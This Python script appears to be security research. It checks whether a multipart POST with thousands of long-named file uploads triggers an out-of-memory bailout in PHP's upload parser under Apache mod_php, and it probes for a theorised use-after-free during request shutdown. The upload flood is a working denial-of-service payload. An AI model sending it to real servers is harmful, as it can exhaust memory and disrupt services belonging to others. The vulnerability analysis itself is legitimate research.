#!/usr/bin/env python3
"""
Chain D Verification: EG() state persistence after OOM in Apache mod_php

Tests two hypotheses:
  H1: Apache prefork MPM reuses the same worker process for consecutive requests
  H2: After OOM via longjmp(), EG() state from the current request persists
      in a way that php_request_shutdown() can access stale/freed objects

Test sequence:
  1. Reset logs
  2. Populate: normal request creates 100 tracked objects in EG(objects_store)
     → objects are destroyed in php_request_shutdown(), destructors logged
  3. Verify PID matches (H1)
  4. OOM bomb: multipart POST triggers OOM inside rfc1867_post_handler()
     → longjmp() fires, shutdown handler runs
  5. Probe: check if the worker survived, read logs
  6. Analyze: compare destructor logs pre/post OOM, check for anomalies

Expected results:
  - H1 confirmed: same PID across all requests
  - H2 (the gap): EG() is re-initialized per request by php_request_startup(),
    so objects from request 2 (populate) don't leak into request 3 (OOM).
    However, the OOM request itself may leave partially-constructed state
    that shutdown handlers walk incorrectly.

For authorized security research only.
"""

import argparse
import re
import socket
import sys
import time


def http_get(host, port, path, timeout=10):
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1].decode("latin1", "replace")
    return ""


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def extract_pid(body):
    m = re.search(r"PID:\s*(\d+)", body)
    return int(m.group(1)) if m else None


def send_oom_multipart(host, port, path, num_files=16000, fname_size=500, timeout=60):
    boundary = "CHAIND_OOM_VERIFY"
    parts = []
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=timeout)
    sent = 0
    while sent < len(req):
        chunk = req[sent:sent + 65536]
        s.sendall(chunk)
        sent += len(chunk)
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser(
        description="Chain D: Verify EG() persistence after OOM in mod_php")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--path", default="/chain_d_probe.php")
    ap.add_argument("--num-files", type=int, default=16000)
    ap.add_argument("--fname-size", type=int, default=500)
    args = ap.parse_args()

    base = f"{args.host}:{args.port}"
    probe_path = args.path

    print("=" * 70)
    print("  Chain D Verification: EG() State After OOM in Apache mod_php")
    print("=" * 70)
    print(f"  Target: {base}")
    print(f"  Probe:  {probe_path}")
    print(f"  OOM:    {args.num_files} files x {args.fname_size}B filenames")
    print()

    # ── Step 0: Reset ─────────────────────────────────────────────────
    print("[0] Resetting logs...")
    resp = http_get(args.host, args.port, f"{probe_path}?action=reset")
    body = get_body(resp)
    if "RESET OK" not in body:
        print(f"    FAILED: {body[:100]}")
        return 1
    print("    OK")

    # ── Step 1: Baseline PID ──────────────────────────────────────────
    print("\n[1] Baseline: checking worker PID...")
    resp = http_get(args.host, args.port, f"{probe_path}?action=info")
    body = get_body(resp)
    baseline_pid = extract_pid(body)
    print(f"    PID: {baseline_pid}")
    if baseline_pid is None:
        print("    FAILED: could not extract PID")
        return 1

    # ── Step 2: Populate EG(objects_store) ─────────────────────────────
    print("\n[2] Populating EG(objects_store) with 100 tracked objects...")
    resp = http_get(args.host, args.port, f"{probe_path}?action=populate")
    body = get_body(resp)
    populate_pid = extract_pid(body)
    print(f"    PID: {populate_pid}")
    if "POPULATE OK" in body:
        print("    Objects created, destructors will log when they fire")
    else:
        print(f"    UNEXPECTED: {body[:200]}")

    # ── Step 3: Verify PID match (H1) ─────────────────────────────────
    print("\n[3] H1: Same worker process?")
    if baseline_pid == populate_pid:
        print(f"    CONFIRMED: PID {baseline_pid} == {populate_pid}")
    else:
        print(f"    DIFFERENT: {baseline_pid} != {populate_pid}")
        print("    Worker pool may have multiple children")

    # ── Step 4: Check destructor logs from populate request ───────────
    print("\n[4] Checking destructor logs from populate request...")
    time.sleep(0.5)
    resp = http_get(args.host, args.port, f"{probe_path}?action=probe")
    body = get_body(resp)
    probe_pid = extract_pid(body)
    print(f"    Probe PID: {probe_pid}")

    destruct_section = ""
    if "--- destruct log ---" in body:
        destruct_section = body.split("--- destruct log ---")[1].split("---")[0].strip()
    shutdown_section = ""
    if "--- shutdown log ---" in body:
        shutdown_section = body.split("--- shutdown log ---")[1].split("---")[0].strip()

    destruct_count = destruct_section.count("DESTRUCT")
    shutdown_count = shutdown_section.count("SHUTDOWN")
    print(f"    Destructor calls logged: {destruct_count}")
    print(f"    Shutdown calls logged: {shutdown_count}")

    if destruct_count >= 100:
        print("    All 100 objects properly destructed in request shutdown")
    elif destruct_count > 0:
        print(f"    PARTIAL: only {destruct_count}/100 destructors fired")
    else:
        print("    No destructor logs (objects cleaned up without logging)")

    # ── Step 5: Reset logs before OOM ─────────────────────────────────
    print("\n[5] Resetting logs before OOM test...")
    resp = http_get(args.host, args.port, f"{probe_path}?action=reset")
    print("    OK")

    # ── Step 6: Populate again (fresh objects for this test) ──────────
    print("\n[6] Populating EG() again (pre-OOM state)...")
    resp = http_get(args.host, args.port, f"{probe_path}?action=populate")
    body = get_body(resp)
    pre_oom_pid = extract_pid(body)
    print(f"    PID: {pre_oom_pid}")
    if pre_oom_pid == baseline_pid:
        print("    Same worker (prefork reuse confirmed)")

    # ── Step 7: OOM bomb ──────────────────────────────────────────────
    print(f"\n[7] Sending OOM bomb ({args.num_files} file uploads)...")
    print("    This triggers OOM inside rfc1867_post_handler()...")
    oom_resp = send_oom_multipart(
        args.host, args.port, args.path,
        num_files=args.num_files,
        fname_size=args.fname_size)

    oom_triggered = False
    worker_crashed = False

    if oom_resp:
        status = get_status(oom_resp)
        oom_body = get_body(oom_resp)
        print(f"    Response: {status}")

        if "500" in status:
            oom_triggered = True
            print("    [+] 500 returned - OOM bailout")
        elif "Fatal error" in oom_body or "Allowed memory size" in oom_body:
            oom_triggered = True
            if "tried to allocate" in oom_body:
                idx = oom_body.find("tried to allocate")
                print(f"    [+] OOM: {oom_body[idx:idx+60]}")
            else:
                print("    [+] OOM triggered (fatal error)")
        else:
            print("    [-] No OOM detected")
    else:
        oom_triggered = True
        worker_crashed = True
        print("    [+] No response - worker crashed")

    # ── Step 8: Post-OOM probe ────────────────────────────────────────
    print("\n[8] Post-OOM probe...")
    time.sleep(1)

    try:
        resp = http_get(args.host, args.port, f"{probe_path}?action=probe")
        body = get_body(resp)
        post_oom_pid = extract_pid(body)
        print(f"    PID: {post_oom_pid}")

        if post_oom_pid == pre_oom_pid:
            print("    SAME worker survived OOM (prefork did NOT kill child)")
        elif post_oom_pid is not None:
            print(f"    DIFFERENT worker: {pre_oom_pid} -> {post_oom_pid}")
            print("    Old worker was killed/replaced after OOM")
        else:
            print("    Could not extract PID")

        # Parse logs
        destruct_section = ""
        if "--- destruct log ---" in body:
            destruct_section = body.split("--- destruct log ---")[1].split("---")[0].strip()
        shutdown_section = ""
        if "--- shutdown log ---" in body:
            shutdown_section = body.split("--- shutdown log ---")[1].split("---")[0].strip()
        verify_section = ""
        if "--- verify log ---" in body:
            verify_section = body.split("--- verify log ---")[1].strip()

        print(f"\n    Destructor log ({destruct_section.count('DESTRUCT')} entries):")
        if destruct_section and destruct_section != "(empty)":
            for line in destruct_section.split("\n")[:5]:
                print(f"      {line}")
            if destruct_section.count("\n") > 5:
                print(f"      ... ({destruct_section.count('DESTRUCT')} total)")
        else:
            print("      (none)")

        print(f"\n    Shutdown log ({shutdown_section.count('SHUTDOWN')} entries):")
        if shutdown_section and shutdown_section != "(empty)":
            for line in shutdown_section.split("\n")[:5]:
                print(f"      {line}")
        else:
            print("      (none)")

        print(f"\n    Verify log:")
        if verify_section and verify_section != "(empty)":
            for line in verify_section.split("\n")[:5]:
                print(f"      {line}")
        else:
            print("      (none)")

        # Check for anomalies
        print(f"\n    GC state:")
        for line in body.split("\n"):
            if line.startswith("gc_") or line.startswith("memory_") or line.startswith("peak_") or line.startswith("last_error"):
                print(f"      {line}")

    except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
        worker_crashed = True
        print(f"    Worker unreachable: {e}")

    # ── Analysis ──────────────────────────────────────────────────────
    print()
    print("=" * 70)
    print("  ANALYSIS")
    print("=" * 70)

    print()
    print("  H1 (Worker reuse in prefork MPM):")
    if baseline_pid == populate_pid == pre_oom_pid:
        print(f"    CONFIRMED - PID {baseline_pid} handled all pre-OOM requests")
    else:
        print("    INCONCLUSIVE - PIDs varied")

    print()
    print("  H2 (EG() state after OOM):")
    if oom_triggered:
        print("    OOM triggered inside rfc1867 multipart parser: YES")
        if worker_crashed:
            print("    Worker survived OOM: NO (process killed)")
            print()
            print("    The worker process was killed after OOM. In prefork MPM,")
            print("    Apache spawns a replacement child. This means EG() state")
            print("    is destroyed with the process - no cross-request UAF possible.")
            print("    However, WITHIN the dying request, php_request_shutdown()")
            print("    still runs and may walk corrupted structures.")
        else:
            print("    Worker survived OOM: YES")
            print()
            print("    KEY FINDING: The worker process survived the OOM.")
            print("    This means:")
            print("    1. longjmp() jumped back to the bailout handler")
            print("    2. php_request_shutdown() ran and cleaned up EG()")
            print("    3. ZMM (Zend Memory Manager) destroyed the request heap")
            print("    4. The worker is ready for the next request with fresh EG()")
            print()
            print("    For Chain D UAF theory:")
            print("    - EG() does NOT persist across requests (re-initialized each time)")
            print("    - The vulnerability window is WITHIN a single request:")
            print("      OOM fires -> longjmp -> shutdown walks partially-init structures")
            print("    - On stock PHP, ZMM cleanup is robust enough to prevent crashes")
            print("    - ASAN build would detect the invalid memory access")
    else:
        print("    OOM NOT triggered - increase --num-files")

    print()
    print("  Chain D feasibility assessment:")
    print("    - Multipart OOM on any endpoint: CONFIRMED")
    print("    - Cross-request EG() persistence: NOT how it works")
    print("      (EG() is per-request, reset by php_request_startup())")
    print("    - Intra-request shutdown UAF: THEORETICAL")
    print("      (longjmp skips cleanup, shutdown walks stale structures)")
    print("    - Requires ASAN build or heap grooming to demonstrate impact")
    print("=" * 70)

    return 0


if __name__ == "__main__":
    sys.exit(main())
